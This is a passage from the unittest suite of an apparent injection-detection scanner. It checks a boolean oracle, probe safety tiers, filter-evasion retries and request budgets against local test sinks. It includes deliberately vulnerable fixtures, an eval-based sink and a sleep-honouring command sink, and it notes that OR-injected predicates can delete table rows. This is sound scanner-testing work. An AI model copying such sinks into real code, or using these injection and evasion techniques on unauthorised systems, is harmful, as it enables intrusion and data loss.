                            rcekit.response_shape(500, self._page(["a"])))


class BooleanTargets:
    """The sinks the boolean oracle is measured against.

    Every one of them wraps its answer in ordinary page chrome -- a token that
    changes per request, a timestamp, a counter -- because a target without
    that is a target this oracle was never at risk from.
    """

    ROWS = ("alpha", "bravo", "charlie")

    def __init__(self, seed=5):
        self.rng = random.Random(seed)
        self.requests = 0

    def chrome(self, inner):
        self.requests += 1
        return ("<html><head><meta name=csrf content='%08x'></head><body>"
                "<p>generated %d</p>%s<footer>req %d</footer></body></html>"
                % (self.rng.getrandbits(32), self.rng.getrandbits(30), inner,
                   self.rng.getrandbits(20)))

    def _listing(self, rows):
        return "<ul>%s</ul>" % "".join(f"<li>{row}</li>" for row in rows)

    @staticmethod
    def _evaluates(expression):
        """The sink: it evaluates the expression and renders nothing of it.

        A sandbox with no builtins, which is what makes this the shape no
        shipped oracle can reach -- there is no shell, no egress and no value
        in the response."""
        try:
            return bool(eval(expression, {"__builtins__": {}}, {}))  # noqa: S307
        except Exception:
            return False

    # -- the sink the method exists for ------------------------------------
    def evaluating(self, method, path, params, headers, body):
        hit = self._evaluates(params.get("q", ""))
        return (200, self.chrome(self._listing(self.ROWS) if hit
                                 else "<ul></ul><p>no results</p>"))

    def evaluating_json(self, method, path, params, headers, body):
        hit = self._evaluates(params.get("q", ""))
        return (200, json.dumps({"request": "%08x" % self.rng.getrandbits(32),
                                 "results": list(self.ROWS) if hit else []}))

    # -- the three ways it can be lied to ----------------------------------
    def reflecting(self, method, path, params, headers, body):
        """Echoes the payload and evaluates nothing. The naive form of this
        oracle called this target vulnerable in 40 runs out of 40."""
        return (200, self.chrome("<p>searched for: %s</p>%s"
                                 % (params.get("q", ""), self._listing(self.ROWS))))

    def wobbling(self, method, path, params, headers, body):
        """Never reads the payload; its listing varies on its own. The naive
        oracle called this vulnerable in 32 runs out of 40."""
        return (200, self.chrome(
            self._listing(self.ROWS[:self.rng.randint(0, len(self.ROWS))])))

    def caching_degrader(self, switch):
        """The same input-blind degradation, behind a cache keyed on the query
        string -- which is what most GET endpoints sit behind.

        Every probe payload is unique and so stays live. What a cache *can*
        replay is a payload sent more than once, which is why the anchors are
        three different true predicates rather than one repeated: identical
        anchors would be one live request and two replays of it, and the
        closing anchor would agree with the opening one whatever happened in
        between."""
        cache = {}

        def route(method, path, params, headers, body):
            key = params.get("q", "")
            if key in cache:
                return (200, cache[key])
            served = self.degrading_after(switch)(method, path, params, headers, body)
            cache[key] = served[1]
            return served

        return route

    def degrading_after(self, switch):
        """Never reads the payload either, but starts refusing to work
        part-way through -- a rate limiter, a filling log, a pool running out.

        Fired in the order they were built, every true predicate then every
        false one, this target splits the series perfectly: measured at the
        worst switch point of a sweep, an ordered series read as a clean
        finding in 100 runs out of 100."""

        def route(method, path, params, headers, body):
            if self.requests >= switch:
                return (200, self.chrome("<ul></ul><p>slow down</p>"))
            return (200, self.chrome(self._listing(self.ROWS)))

        return route


def _boolean_record(**overrides):
    overrides.setdefault("context", "raw")
    return make_record(**overrides)


class BooleanOracleTestCase(unittest.TestCase):
    """`/vuln` executes, `/reflect` echoes -- the test every detection method in
    this repository owes, applied to the one oracle with no computed value to
    lean on."""

    def _run(self, route, records=None, config=None, gen=None):
        gen = gen or RCEKit()
        with local_target(route) as base:
            results = gen.run_detection(
                records or [_boolean_record()], url=f"{base}/s?q=FUZZ",
                methods=["boolean"], config=dict(config or {}), timeout=15)
        return gen, results

    def test_a_sink_that_evaluates_the_predicate_is_reported(self):
        targets = BooleanTargets()
        _gen, results = self._run(targets.evaluating)
        self.assertEqual([r["verdict"] for r in results], ["evaluation-sink"])
        self.assertIn("partitioned", results[0]["detail"])

    def test_a_json_sink_is_reported_too(self):
        targets = BooleanTargets()
        _gen, results = self._run(targets.evaluating_json)
        self.assertEqual([r["verdict"] for r in results], ["evaluation-sink"])

    def test_a_target_that_only_reflects_is_negative(self):
        targets = BooleanTargets()
        _gen, results = self._run(targets.reflecting)
        self.assertEqual([r["verdict"] for r in results], ["negative"])

    def test_the_finding_says_it_is_not_execution(self):
        """The evidence line carries the limit, not just the docs.

        Against a sandboxed `eval` sink and against a plain SQLite predicate
        this oracle produced an identical differential in 40 runs each. A
        reader of one finding cannot be expected to know that; the finding has
        to say it."""
        targets = BooleanTargets()
        _gen, results = self._run(targets.evaluating)
        self.assertIn("not execution", results[0]["detail"])


class BooleanNeverConfirmsTestCase(unittest.TestCase):
    """The tier ceiling, stated as behaviour rather than as an attribute.

    `executed` means the target executed the input. This oracle cannot show
    that: it reports a differential, and a query engine comparing two numbers
    produces the same differential. Widening `executed` to include it would
    end the one guarantee the tool rests on.

    The ceiling is `evaluation-sink`, which is a *proven* finding about
    something narrower -- an evaluator consumed the input. It reported
    `needs-review` until 3.0.0, which named the tool's confidence rather than
    the target's behaviour and read as though the measurement had not settled.
    """

    def test_the_class_declares_a_ceiling_below_execution(self):
        self.assertEqual(rcekit.DETECTION_METHODS["boolean"].tier, "evaluation-sink")
        self.assertNotEqual(rcekit.DETECTION_METHODS["boolean"].tier,
                            rcekit.EXECUTION_TIER)

    def test_the_ceiling_is_not_a_confidence_word(self):
        """The whole point of the rename: a settled measurement does not report
        under a tier that says it needs reviewing."""
        self.assertNotEqual(rcekit.DETECTION_METHODS["boolean"].tier,
                            "needs-review")

    def test_no_series_of_any_shape_produces_confirmed(self):
        """Drive `confirm_series` directly across the whole space of answers a
        target could give, including the perfect one."""
        meth = rcekit.DETECTION_METHODS["boolean"](RCEKit(), {})
        probes = meth.build_probes(_boolean_record(), random.Random(1))
        self.assertTrue(probes, "the method built nothing to judge")
        bodies = ("<ul><li>a</li></ul>", "<ul></ul>", "<p>err</p>")
        rng = random.Random(7)
        for trial in range(200):
            series = []
            for probe in probes:
                if probe.phase == "anchor-open" or probe.phase == "anchor-close":
                    body = bodies[0]
                elif trial == 0:
                    # The perfect answer: every true one way, every false the
                    # other. This is the series that earns the method's best
                    # verdict, and its best verdict is still not `executed`.
                    body = bodies[0] if probe.phase == "yes" else bodies[1]
                else:
                    body = rng.choice(bodies)
                series.append((probe, Observation(status=200, body=body)))
            verdict = meth.confirm_series(series)
            with self.subTest(trial=trial):
                self.assertNotEqual(verdict.status, rcekit.EXECUTION_TIER)
        # And the perfect series really did reach the ceiling, so the assertion
        # above is not passing because nothing was ever found.
        best = [(probe, Observation(status=200,
                                    body=bodies[0] if probe.phase != "no" else bodies[1]))
                for probe in probes]
        self.assertEqual(meth.confirm_series(best).status, "evaluation-sink")


class BooleanUnreadableChannelTestCase(unittest.TestCase):
    """A channel that cannot carry one bit is `inconclusive`, never `negative`.

    `negative` asserts the probes reached the target and found nothing. Here
    the probes reached the target and the run could not read an answer out of
    them -- the same false clean `blocked` and `nothing-tested` exist to
    prevent, one oracle further in.
    """

    def _run(self, route, records=None):
        gen = RCEKit()
        with local_target(route) as base:
            return gen.run_detection(records or [_boolean_record()],
                                     url=f"{base}/s?q=FUZZ", methods=["boolean"],
                                     config={}, timeout=15)

    def test_a_response_that_varies_on_its_own_is_inconclusive(self):
        results = self._run(BooleanTargets().wobbling)
        self.assertEqual([r["verdict"] for r in results], ["inconclusive"])

    def test_a_cache_cannot_answer_the_anchors_for_the_target(self):
        """The anchors are three different true predicates, not one sent three
        times, and this is the difference.

        Measured against an input-blind target that degrades mid-series and
        replays any query string it has already answered: identical anchors
        caught it in 36 of 39 runs live and in **0 of 39** behind the cache --
        the guard was not weakened, it was switched off. Distinct payloads are
        each a live request, so the check measures the target."""
        targets = BooleanTargets()
        results = self._run(targets.caching_degrader(2 + 4 * 2))
        self.assertEqual([r["verdict"] for r in results], ["inconclusive"])

    def test_every_anchor_is_a_different_predicate(self):
        meth = rcekit.DETECTION_METHODS["boolean"](RCEKit(), {})
        probes = meth.build_probes(_boolean_record(), random.Random(5))
        anchors = [p.payload for p in probes if p.phase.startswith("anchor")]
        self.assertEqual(len(anchors), 3)
        self.assertEqual(len(set(anchors)), 3,
                         "a repeated anchor payload is one a cache can replay")

    def test_a_target_that_degrades_mid_series_is_not_a_finding(self):
        """The anchor either side, which is the guard that earned its place
        last: shuffling alone still left 2 false findings in 100, because a
        shuffle can land separable by chance. A target that moved during the
        series cannot answer the closing anchor the way it answered the
        opening one."""
        targets = BooleanTargets()
        # Two opening anchors, then the series: the switch is placed exactly
        # where a true-then-false ordering would split cleanly.
        results = self._run(targets.degrading_after(2 + 4 * 2))
        self.assertEqual([r["verdict"] for r in results], ["inconclusive"])
        self.assertIn("moved while the series", results[0]["detail"])


class BooleanConnectiveTestCase(unittest.TestCase):
    """`AND` is safe, `OR` is not, and both are needed.

    Measured: `AND` differentiates only where the application's own predicate
    is true and `OR` only where it is false, so they are complements. And a
    true predicate `OR`-ed into a `DELETE ... WHERE` took a table from 3 rows
    to 0, where the same predicate `AND`-ed into it left all 3.
    """

    def _probes(self, config=None):
        meth = rcekit.DETECTION_METHODS["boolean"](RCEKit(), dict(config or {}))
        return meth, meth.build_probes(_boolean_record(), random.Random(3))

    def test_every_or_shape_asks_for_the_top_rung(self):
        meth, probes = self._probes()
        ors = [p for p in probes if p.carrier in ("or", "or-word")]
        self.assertTrue(ors, "no OR shapes were built")
        for probe in ors:
            with self.subTest(carrier=probe.carrier):
                self.assertEqual(meth.probe_safety(probe), "stateful")

    def test_no_and_shape_asks_for_more_than_safe(self):
        meth, probes = self._probes()
        ands = [p for p in probes if p.carrier in ("bare", "and", "and-word")]
        self.assertTrue(ands)
        for probe in ands:
            with self.subTest(carrier=probe.carrier):
                self.assertEqual(meth.probe_safety(probe), "safe")

    def test_the_default_run_holds_the_or_shapes_back_by_name(self):
        gen = RCEKit()
        targets = BooleanTargets()
        with local_target(targets.evaluating) as base:
            gen.run_detection([_boolean_record()], url=f"{base}/s?q=FUZZ",
                              methods=["boolean"], config={}, timeout=15)
        self.assertGreater(gen.safety_held_probes, 0)
        named = " ".join(gen.safety_held_reasons)
        self.assertIn("boolean/or", named)
        self.assertIn("--verify-active-risk stateful", named)

    def test_raising_the_rung_sends_them(self):
        # A coverage hole is a false negative wearing a safety label, so the OR
        # shapes ship -- behind the flag, and they really do go when it is set.
        gen = RCEKit()
        targets = BooleanTargets()
        with local_target(targets.evaluating) as base:
            gen.run_detection([_boolean_record()], url=f"{base}/s?q=FUZZ",
                              methods=["boolean"],
                              config={"max_safety": "stateful"}, timeout=15)
        self.assertEqual(gen.safety_held_probes, 0)


class BooleanSeriesShapeTestCase(unittest.TestCase):
    """How the series is built: the pair floor, the ordering, and the anchors.

    Each of these is a measured false-finding rate rather than a preference.
    """

    def _probes(self, config=None, record=None, seed=3):
        meth = rcekit.DETECTION_METHODS["boolean"](RCEKit(), dict(config or {}))
        return meth, meth.build_probes(record or _boolean_record(), random.Random(seed))

    def test_a_connective_never_runs_at_a_single_pair(self):
        """One pair claimed a differential on an ordinary noisy target in 46 of
        200 runs. Two claimed none in 200. There is no honest rung below two,
        so `--probe-depth quick` trades four for two and never for one."""
        self.assertGreaterEqual(min(rcekit.DETECTION_METHODS["boolean"].PAIRS.values()), 2)
        for depth in ("quick", "full"):
            meth, probes = self._probes({"probe_depth": depth})
            for name, _form, _rung in meth.CONNECTIVES:
                built = [p for p in probes if p.carrier == name]
                with self.subTest(depth=depth, connective=name):
                    self.assertGreaterEqual(len(built), 4)
                    self.assertEqual(sum(1 for p in built if p.phase == "yes"),
                                     sum(1 for p in built if p.phase == "no"))

    def test_a_connective_thinned_below_the_floor_is_skipped_not_graded_down(self):
        """A profile or a rung can remove probes after they are built. Judging
        a connective on what survives would put the run back at the pair count
        the measurement rejected, silently and only for the operator who
        narrowed the run."""
        meth, probes = self._probes()
        bare = [p for p in probes if p.carrier == "bare"]
        # One pair left, answering perfectly.
        thinned = [next(p for p in bare if p.phase == "yes"),
                   next(p for p in bare if p.phase == "no")]
        series = [(p, Observation(status=200, body="<ul><li>a</li></ul>"))
                  for p in probes if p.phase == "anchor-open" or p.phase == "anchor-close"]
        series += [(p, Observation(status=200,
                                   body="<ul><li>a</li></ul>" if p.phase == "yes"
                                        else "<ul></ul>"))
                   for p in thinned]
        self.assertEqual(meth.confirm_series(series).status, "negative")

    def test_a_floor_on_the_total_is_not_a_floor_on_each_side(self):
        """Three true probes and one false one clear a floor counted across
        both sides -- and then the false side agrees with itself because there
        is only one of it. That is the single-pair answer arriving by the back
        door, on the half where a target gets to look clean."""
        meth, probes = self._probes()
        bare = [p for p in probes if p.carrier == "bare"]
        thinned = [p for p in bare if p.phase == "yes"][:3]
        thinned += [p for p in bare if p.phase == "no"][:1]
        series = [(p, Observation(status=200, body="<ul><li>a</li></ul>"))
                  for p in probes if p.phase in ("anchor-open", "anchor-close")]
        series += [(p, Observation(status=200,
                                   body="<ul><li>a</li></ul>" if p.phase == "yes"
                                        else "<ul></ul>"))
                   for p in thinned]
        self.assertEqual(meth.confirm_series(series).status, "negative")

    def test_the_series_is_not_fired_in_truth_order(self):
        """Every true predicate and then every false one is the one ordering a
        target can answer by accident. At the worst switch point of a swept
        degradation, an ordered series read as a clean finding in 100 runs out
        of 100 -- from a target that never looked at the payload."""
        _meth, probes = self._probes()
        answers = [p.phase for p in probes if p.phase in ("yes", "no")]
        ordered = sorted(answers, key=lambda phase: phase != "yes")
        self.assertNotEqual(answers, ordered,
                            "the probes go out in truth order, so a target that "
                            "degrades during the run reads as a finding")

    def test_the_firing_order_is_not_the_same_twice(self):
        """And the order is drawn per run rather than fixed.

        The build order alone is already interleaved, so this is the narrower
        thing the shuffle adds: a target cannot learn the sequence, and two
        runs against the same endpoint do not present it the same series."""
        orders = set()
        for seed in range(8):
            _meth, probes = self._probes(seed=seed)
            orders.add(tuple(p.phase for p in probes))
        self.assertGreater(len(orders), 1,
                           "every run fires the same sequence of true and false probes")

    def test_the_series_is_anchored_at_both_ends(self):
        _meth, probes = self._probes()
        phases = [p.phase for p in probes]
        self.assertEqual(phases[:2], ["anchor-open", "anchor-open"],
                         "nothing measures whether the channel is steady before the series")
        self.assertEqual(phases[-1], "anchor-close",
                         "nothing measures whether it stayed steady during the series")

    def test_a_false_predicate_is_the_same_length_as_a_true_one(self):
        """Matched lengths, so a validator that rejects long values or a filter
        that counts characters cannot answer in the target's place."""
        meth, _probes = self._probes()
        rng = random.Random(11)
        for _ in range(200):
            seed = rng.randrange(1 << 30)
            yes = meth._predicate(random.Random(seed), True)
            no = meth._predicate(random.Random(seed), False)
            self.assertEqual(len(yes), len(no), (yes, no))
            self.assertNotEqual(yes, no)


class BooleanCarrierScopeTestCase(unittest.TestCase):
    """Where the series runs, and where running it again would ask a question
    whose answer cannot differ."""

    def test_one_series_per_context_however_many_environments(self):
        """A predicate carries no shell dialect, so the probes for `unix` and
        for `windows` in the same context are the same bytes -- and the
        aggregate branch, unlike the per-probe one, has no payload
        de-duplication to notice."""
        gen = RCEKit()
        targets = BooleanTargets()
        records = [_boolean_record(environment=env)
                   for env in ("unix", "windows", "powershell")]
        with local_target(targets.evaluating) as base:
            results = gen.run_detection(records, url=f"{base}/s?q=FUZZ",
                                        methods=["boolean"], config={}, timeout=15)
        self.assertEqual(len(results), 1, [r["verdict"] for r in results])
        one_series = RCEKit().estimate_detection_probes(
            [_boolean_record()], ["boolean"], {})
        self.assertEqual(gen.delivered_probes, one_series)

    def test_a_context_that_carries_code_is_not_offered_a_predicate(self):
        """Where the injected input is code -- a statement the context breaks
        out into, or the command itself -- a bare comparison has no observable
        effect, so the probe would be spent asking nothing."""
        meth = rcekit.DETECTION_METHODS["boolean"](RCEKit(), {})
        for context in ("sql", "javascript", "php", "shell_single_quoted",
                        "shell_subshell", "unix_shell", "windows_cmd", "powershell"):
            with self.subTest(context=context):
                self.assertFalse(meth.applicable(_boolean_record(context=context)))

    def test_a_context_that_wraps_the_value_is_offered_one(self):
        """The other half, and the one the first attempt at this got wrong.

        Reading "does the context have a prefix" as "does it break out of a
        statement" refused `attribute`, `attribute_unquoted`, `xml_cdata` and
        `yaml` -- four contexts whose delimiters open and close *around* the
        value, leaving a predicate exactly where a predicate belongs. It also
        offered the three shell dialects, which have no delimiters at all and
        run the value as a command."""
        meth = rcekit.DETECTION_METHODS["boolean"](RCEKit(), {})
        for context in ("raw", "json", "xml", "yaml", "attribute",
                        "attribute_unquoted", "xml_cdata", "http_header"):
            with self.subTest(context=context):
                self.assertTrue(meth.applicable(_boolean_record(context=context)))

    def test_every_shipped_context_has_been_classified(self):
        """A context added to the corpus and never classified would default to
        the predicate side, which is the direction that spends requests on a
        sink that cannot answer. Enumerated here so adding one fails until
        somebody decides which side it is on."""
        shipped = set(RCEKit().contexts)
        code = set(rcekit.CODE_POSITION_CONTEXTS)
        self.assertEqual(
            code - shipped, set(),
            "CODE_POSITION_CONTEXTS names a context the corpus no longer ships")
        self.assertEqual(
            sorted(shipped - code),
            ["attribute", "attribute_unquoted", "graphql_string", "graphql_variable",
             "html", "http_header", "json", "raw", "xml", "xml_cdata", "yaml"],
            "a context was added or moved and nothing decided whether a boolean "
            "predicate can live in it")

    def test_the_cost_line_matches_what_the_run_sends(self):
        """The estimate is what an operator on a monitored engagement sees
        before anything is fired. An aggregate method whose series is built
        once per context is exactly the shape that has made it wrong before."""
        records = [_boolean_record(environment=env) for env in ("unix", "windows")]
        for config in ({}, {"probe_depth": "quick"}, {"max_safety": "stateful"}):
            gen = RCEKit()
            estimate = gen.estimate_detection_probes(records, ["boolean"], config)
            run = RCEKit()
            targets = BooleanTargets()
            with local_target(targets.evaluating) as base:
                run.run_detection(records, url=f"{base}/s?q=FUZZ", methods=["boolean"],
                                  config=dict(config), timeout=15)
            with self.subTest(config=tuple(sorted(config.items()))):
                self.assertEqual(estimate, run.delivered_probes)


class PayloadBudgetTestCase(unittest.TestCase):
    """`--max-payloads` bounds requests, and it used to be checked after they
    had been sent.

    The cap was measured against the number of result *rows*. For a per-probe
    method those are the same number, so nothing showed. An aggregate method is
    one row however many probes it costs, so the whole series went out first
    and the cap noticed afterwards: at `--max-payloads 1`, `time` sent 12,
    `deser` 15 and `boolean` 27, while the cost line printed before any traffic
    said 1. That line is the only thing an operator bounding a monitored
    engagement has to go on, and it was wrong in the direction that matters.
    """

    @staticmethod
    def _still(method, path, params, headers, body):
        return (200, "<html><body><ul><li>a</li></ul></body></html>")

    def _record(self, **overrides):
        overrides.setdefault("context", "raw")
        return make_record(**overrides)

    def _run(self, methods, cap, config=None):
        gen = RCEKit()
        config = dict(config or {})
        config.setdefault("time_base", 0.2)
        with local_target(self._still) as base:
            results = gen.run_detection(
                [self._record()], url=f"{base}/s?q=FUZZ", methods=list(methods),
                config=config, max_payloads=cap, timeout=10)
        return gen, results

    def _estimate(self, methods, cap, config=None):
        config = dict(config or {})
        config.setdefault("time_base", 0.2)
        return RCEKit().estimate_detection_probes(
            [self._record()], list(methods), config, max_payloads=cap)

    def test_no_method_sends_more_requests_than_the_cap(self):
        """The whole claim, swept rather than sampled: every method this
        environment can run without a callback host or a write path, alone and
        mixed, at caps above and below what each one needs."""
        runnable = [name for name, cls in rcekit.DETECTION_METHODS.items()
                    if not cls.needs_oob_host and not cls.gated_by_config]
        self.assertGreaterEqual(len(runnable), 5, runnable)
        combinations = [[name] for name in sorted(runnable)] + [sorted(runnable)]
        for methods in combinations:
            for cap in (1, 3, 5, 12, 30):
                with self.subTest(methods=",".join(methods), cap=cap):
                    gen, _results = self._run(methods, cap)
                    self.assertLessEqual(
                        gen.delivered_probes, cap,
                        f"{','.join(methods)} sent {gen.delivered_probes} requests "
                        f"under --max-payloads {cap}")

    def test_an_aggregate_method_alone_is_bounded(self):
        # The three that overran, named so a regression says which one came
        # back rather than only that something did.
        for method, sent_before in (("time", 12), ("deser", 15), ("boolean", 27)):
            with self.subTest(method=method):
                gen, _results = self._run([method], 1)
                self.assertLessEqual(gen.delivered_probes, 1,
                                     f"{method} used to send {sent_before} here")

    def test_requests_an_aggregate_method_spent_are_charged_to_the_budget(self):
        """Rows were the wrong meter in a second way.

        A series the budget abandons costs requests and produces no row at all,
        so a cap counted in rows left the next carrier the same allowance and
        it fired again -- `time` at `--max-payloads 5` sent 4 requests per
        carrier with the cap never moving. And in a mixed run the per-probe
        method never saw what the aggregate one had already spent."""
        gen, _results = self._run(["time", "reflected"], 5)
        self.assertLessEqual(gen.delivered_probes, 5)
        gen, _results = self._run(["boolean", "eval"], 30)
        self.assertLessEqual(gen.delivered_probes, 30)

    def test_the_cost_line_matches_the_traffic_under_a_cap(self):
        """The estimate and the run make the same decision, or the audit is
        noise. Uncapped it stays a floor by documented design -- a wave a
        method picks after seeing its own timings cannot be predicted from
        here -- so this is asserted exactly where the operator reached for a
        bound."""
        for methods in (["boolean"], ["deser"], ["reflected"], ["boolean", "eval"]):
            for cap in (1, 5, 30):
                with self.subTest(methods=",".join(methods), cap=cap):
                    gen, _results = self._run(methods, cap)
                    self.assertEqual(self._estimate(methods, cap), gen.delivered_probes)


class BudgetCountsEveryRequestTestCase(unittest.TestCase):
    """The meter has to see every request the target receives.

    `delivered_probes` is what `--max-payloads` is spent against, so anything
    that reaches the target without incrementing it is traffic outside the
    bound. An evasion retry was exactly that: measured at `--max-payloads 5
    --evade high` against a filter that refuses whitespace, the target received
    12 requests and the run recorded 5.
    """

    @staticmethod
    def _refuses_whitespace(received):
        def route(method, path, params, headers, body):
            value = params.get("cmd", "")
            received.append(value)
            if any(char in value for char in (" ", "	", chr(10))):
                return (403, "<html>403 blocked</html>")
            return (200, f"out: {value}")
        return route

    def _run(self, cap, evade):
        received = []
        gen = RCEKit()
        with local_target(self._refuses_whitespace(received)) as base:
            gen.run_detection(
                [make_record(environment="unix", context="raw")],
                url=f"{base}/x?cmd=FUZZ", methods=["reflected"],
                config={"evade": evade}, max_payloads=cap, timeout=10)
        # One payload-free control per run, which the cap has never covered.
        return gen, len(received) - 1

    def test_the_counter_matches_what_the_target_received(self):
        for cap in (1, 2, 3, 5, 8, 12, 20):
            for evade in ("none", "low", "high"):
                gen, delivered = self._run(cap, evade)
                with self.subTest(cap=cap, evade=evade):
                    self.assertEqual(
                        gen.delivered_probes, delivered,
                        "requests reached the target without being counted")

    def test_evasion_retries_stay_inside_the_cap(self):
        # 10 and 23 are in the sweep deliberately: they are where a budget
        # checked once before the ladder, rather than per rung, let one refused
        # probe spend three requests and overshoot by one.
        for cap in (1, 2, 3, 5, 8, 10, 12, 20, 23):
            for evade in ("low", "high"):
                gen, delivered = self._run(cap, evade)
                with self.subTest(cap=cap, evade=evade):
                    self.assertLessEqual(
                        delivered, cap,
                        f"--evade {evade} put {delivered} probes on the target under "
                        f"--max-payloads {cap}")

    def test_one_probe_may_be_retried_at_more_than_one_rung(self):
        """Non-vacuity, and the reason the budget is checked per rung rather
        than once before the ladder: a refused probe is retried at `low` and
        again at `high`, so one probe can cost three requests. Checked at the
        call site alone, that overshot the cap by one -- 11 requests against
        `--max-payloads 10 --evade high`."""
        gen, _delivered = self._run(None, "high")
        self.assertGreater(gen.escalated_probes, 0, "nothing was ever retried")

    def test_the_audit_counts_deliveries_rather_than_rows(self):
        """`sent N probes` is a claim about what the target received.

        Rows are the same number for a method that answers from each probe,
        which is why it read true for so long. An aggregate method reports one
        row for a whole series, so a `time` run that put 20 requests on the
        target announced 5 -- and a measurement the budget declined announced
        one probe for traffic that never left."""
        source = (REPO_ROOT / "rcekit.py").read_text(encoding="utf-8")
        self.assertIn("sent {generator.delivered_probes} probes", source,
                      "the detection summary counts result rows as sent probes")


class WholeSeriesBudgetTestCase(unittest.TestCase):
    """A budget may stop a series; it may never cut one in half.

    Where each probe carries its own verdict, the probes that went out keep
    theirs and the rest are simply not sent. Where only the series answers,
    part of one is not a weaker answer but a wrong one -- and wrong in the
    direction this tool exists to prevent, because `time` reports `negative`
    from a screen with no regression behind it and from a regression short of
    four samples, and a truncated `boolean` series reaches `negative` once its
    connectives fall under the pair floor.
    """

    @staticmethod
    def _still(method, path, params, headers, body):
        return (200, "<html><body><ul><li>a</li></ul></body></html>")

    def _run(self, methods, cap):
        gen = RCEKit()
        with local_target(self._still) as base:
            results = gen.run_detection(
                [make_record(context="raw")], url=f"{base}/s?q=FUZZ",
                methods=list(methods), config={"time_base": 0.2},
                max_payloads=cap, timeout=10)
        return gen, results

    def test_a_budget_too_small_for_a_verdict_never_reports_negative(self):
        for method in ("time", "boolean"):
            with self.subTest(method=method):
                gen, results = self._run([method], 1)
                self.assertGreater(gen.budget_held_series, 0)
                self.assertNotIn("negative", {r["verdict"] for r in results},
                                 f"{method} judged a series it could not afford to fire")

    def test_an_abandoned_measurement_leaves_a_row_rather_than_a_silence(self):
        """Dropping it silently let the *other* carriers describe the run, and
        the other carriers are the ones with nothing to find.

        Measured at `--max-payloads 12` against a sink that honours an injected
        sleep: the unix carrier's regression was abandoned for budget, a
        windows carrier's honest "no separator delayed" was the only row left,
        and the run reported `negative` for a target that was vulnerable.
        `inconclusive` is what an abandoned measurement is in the word the tool
        already uses, and it outranks `negative` in the run verdict, so one
        held-back measurement stops the whole run reading clean."""
        gen, results = self._run(["boolean"], 3)
        self.assertGreater(gen.budget_held_series, 0)
        self.assertTrue(results, "a measurement was dropped without a trace")
        self.assertEqual({r["verdict"] for r in results}, {"inconclusive"})
        self.assertNotEqual(rcekit.overall_detection_verdict(results), "negative")
        self.assertIn("--max-payloads", results[0]["detail"])

    def test_the_run_says_which_measurement_it_declined_and_why(self):
        # A ladder that shrinks quietly is indistinguishable from a target with
        # nothing to find, which is why the risk tier names what it holds back
        # too.
        gen, _results = self._run(["boolean"], 3)
        named = " ".join(gen.budget_held_reasons)
        self.assertIn("boolean", named)
        self.assertIn("--max-payloads", named)

    def test_one_declined_measurement_is_counted_once(self):
        """`boolean` measures a context once however many environments share
        it, so the carriers after the first build nothing. Counting those as
        held back reported one declined measurement three times."""
        gen = RCEKit()
        records = [make_record(context="raw", environment=env)
                   for env in ("unix", "windows", "powershell")]
        with local_target(self._still) as base:
            gen.run_detection(records, url=f"{base}/s?q=FUZZ", methods=["boolean"],
                              config={}, max_payloads=3, timeout=10)
        self.assertEqual(gen.budget_held_series, 1)

    def test_a_per_probe_method_is_truncated_rather_than_declined(self):
        """The other half. `deser` decides per probe, so a budget that stops it
        early costs the probes not sent and nothing else -- declining it
        outright would throw away answers it had already earned.

        What makes that safe is `deser`'s own guard rather than luck: its shape
        oracle is a differential across four forms, and a carrier left holding
        fewer than four says so instead of reading the ones it has. So a cap
        that cuts a carrier in half produces an `inconclusive` for that carrier
        and leaves the complete ones alone -- never a `negative` inferred from
        evidence that was not gathered."""
        gen, results = self._run(["deser"], 5)
        self.assertEqual(gen.delivered_probes, 5)
        self.assertEqual(gen.budget_held_series, 0)
        self.assertTrue(results, "the budget declined a method that answers per probe")
        self.assertIn("inconclusive", {r["verdict"] for r in results},
                      "a carrier the cap cut short answered from partial evidence")
        # And the complete carriers still answer, so truncation costs coverage
        # rather than the whole method.
        self.assertIn("negative", {r["verdict"] for r in results})

    @staticmethod
    def _sleeping_sink():
        """A real command-injection sink: it runs what is chained onto it, and
        counts how often it was made to sleep.

        A still fixture cannot show the bug this guards. `time` answers
        `negative` there whatever the budget does, because no separator delayed
        and that is the truth -- so a partial series and a complete one agree,
        and a test built on it passes while the tool reports a vulnerable
        target as clean."""
        slept = []

        def route(method, path, params, headers, body):
            value = params.get("q", "")
            match = re.search(r"sleep\s+([0-9.]+)", value)
            # No separator required. A unix carrier also probes the shape where
            # the value *is* the command, and a sink that honours only a
            # chained one leaves those probes legitimately undelayed -- so the
            # sweep below would have been asserting against honest negatives
            # rather than against the bug.
            if match:
                slept.append(1)
                time.sleep(min(float(match.group(1)), 2.0))
            return (200, "<html><body>ok</body></html>")

        return route, slept

    def _sleep_run(self, cap):
        gen = RCEKit()
        route, slept = self._sleeping_sink()
        with local_target(route) as base:
            results = gen.run_detection(
                [make_record(context="raw")], url=f"{base}/s?q=FUZZ",
                methods=["time"], config={"time_base": 0.3},
                max_payloads=cap, timeout=15)
        return gen, results, len(slept)

    # What `time` says when its screen found nothing to regress on. True of a
    # `cmd.exe` carrier against a POSIX sink; a lie about a unix carrier here,
    # where the sink demonstrably sleeps.
    NO_DELAY = "no command separator produced a delay"

    def test_a_budget_never_makes_a_delaying_target_look_like_a_still_one(self):
        """The bug this rule exists for, and one I put there myself.

        The screen wave fit the budget and the regression did not, so the loop
        broke out and built a verdict from screen probes alone -- `negative`,
        "no command separator produced a delay", against a sink that really did
        delay. At `--max-payloads` 4 and 12.

        Asserted on that sentence rather than on the run's verdict, because the
        verdict depends on a slope fitted to real timings and would make this
        flaky on a loaded machine. Whether the *screen* saw a 0.3s sleep is not
        a close call. Swept rather than sampled: the window opens only where
        the budget lands between one wave and the next."""
        for cap in (2, 4, 6, 8, 10, 11, 12, 13, 14, 16, 20):
            gen, results, slept = self._sleep_run(cap)
            with self.subTest(cap=cap):
                self.assertLessEqual(gen.delivered_probes, cap)
                for result in results:
                    if result["environment"] != "unix":
                        continue
                    self.assertNotIn(
                        self.NO_DELAY, result["detail"],
                        f"--max-payloads {cap} left a unix carrier reporting that nothing "
                        f"delayed, against a sink that slept {slept} time(s)")

    def test_the_sink_those_caps_ran_against_really_does_delay(self):
        """Non-vacuity, and the shape that hid the bug in the first place: on a
        fixture that never delays, the sweep above passes while proving
        nothing."""
        gen, results, slept = self._sleep_run(None)
        self.assertGreater(slept, 0, "the fixture was never made to sleep")
        self.assertTrue([r for r in results if r["environment"] == "unix"],
                        "no unix carrier ran, so the sweep asserted nothing")
        self.assertEqual(gen.budget_held_series, 0,
                         "an uncapped run held a measurement back")

    def test_which_methods_answer_per_probe_is_read_from_the_class(self):
        """Not from a list of names. The answer already lives in the class: a
        method that overrides `confirm_each` has a per-probe answer to give."""
